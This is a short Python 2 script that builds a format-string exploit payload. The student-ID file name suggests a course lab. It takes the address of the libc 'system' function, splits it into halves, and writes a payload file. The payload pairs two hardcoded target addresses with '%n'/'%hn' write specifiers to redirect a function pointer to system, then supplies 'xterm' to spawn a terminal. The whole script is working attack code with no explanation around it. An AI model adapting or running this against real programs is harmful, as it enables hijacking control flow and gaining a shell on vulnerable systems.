address = raw_input("Enter address of system function in hexadecimal : ")
address = address[::-1]
part1 = address[0:4]
part2 = address[4:]
part1 = part1[::-1]
part2 = part2[::-1]
part1 = int(part1, 16)
part2 = int(part2, 16)
if part1 < part2:
    if part1 <= 8:
        part11 = part1
        part11 += 16**4
        f = open("CS18B102_CS18B103.exp", "w")
        f.write("\x0c\x30\xbc\x05" + "\x0e\x30\xbc\x05" + "%" + str(part11 - 8) + "u" + "%7$n" + "%" + str(part2-part1) + "u" + "%8$hn" + "\n")
        f.write("xterm")
        f.close()
    else:
        f = open("CS18B102_CS18B103.exp", "w")
        f.write("\x0c\x30\xbc\x05" + "\x0e\x30\xbc\x05" + "%" + str(part1 - 8) + "u" + "%7$hn" + "%" + str(part2-part1) + "u" + "%8$hn" + "\n")
        f.write("xterm")
        f.close()
    
else:
    part1, part2 = part2, part1
    if part1 <= 8:
        part11 = part1
        part11 += 16**4
        f = open("CS18B102_CS18B103.exp", "w")
        f.write("\x0c\x30\xbc\x05" + "\x0e\x30\xbc\x05" + "%" + str(part11 - 8) + "u" + "%7$n" + "%" + str(part2-part1) + "u" + "%8$hn" + "\n")
        f.write("xterm")
        f.close()
    else:
        f = open("CS18B102_CS18B103.exp", "w")
        f.write("\x0c\x30\xbc\x05" + "\x0e\x30\xbc\x05" + "%" + str(part1 - 8) + "u" + "%7$hn" + "%" + str(part2-part1) + "u" + "%8$hn" + "\n")
        f.write("xterm")
        f.close()
